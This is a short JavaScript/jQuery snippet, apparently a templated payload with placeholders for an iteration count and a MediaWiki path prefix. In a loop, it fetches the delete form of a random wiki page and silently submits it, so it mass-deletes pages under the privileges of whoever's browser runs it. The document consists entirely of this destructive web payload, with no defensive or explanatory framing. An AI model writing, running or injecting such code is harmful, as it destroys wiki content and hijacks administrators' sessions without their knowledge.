for(var i = 0; i < Number("%%iter_count%%"); i ++) {
    $.get("%%mw_prefix%%/index.php?title=Special:Random&action=delete", function (data) {
        var delform3 = $(data).find("form[action*='delete']");
        var data_ser = delform3.serialize();
        $.ajax({
            type : "POST",
            url : delform3.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}